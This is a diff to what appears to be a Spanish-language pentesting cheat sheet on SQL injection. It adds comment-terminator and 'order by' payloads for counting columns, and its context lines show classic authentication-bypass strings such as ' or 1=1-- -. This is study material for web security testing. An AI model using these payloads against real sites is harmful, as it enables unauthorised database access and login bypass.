@@ -37,7 +37,7 @@ Tenemos: **DB > TABLAS > COLUMNAS > DATOS**
 
 * [Cheat-Sheet-SQLI](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-## Inyecciones UNION 'mirando el error en el Output de la Web'
+## Inyecciones 'UNION' mirando el error en el Output de la Web'
 
 Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre el **error**.
 * La mayoría de las inyecciones las puedes hacer empezando por  '
@@ -46,6 +46,11 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 
 ```bash
 # MYSQL
+
+# Rara vez acepta la inyeccion SQL sin el primer ' ya que no existe otra comilla por comentar. Al momento de colocar -- - (comentario) y no sale error en la web podriamos iniciar con las SQLi. 
+❯ -- -
+❯ order by 3-- -
+
 
 ❯ ' or '1'='1                                         # La mas sencilla y nos devolveria un true, dejamos una comilla sin cerrar ya que la propia query la cerrara
 ❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login
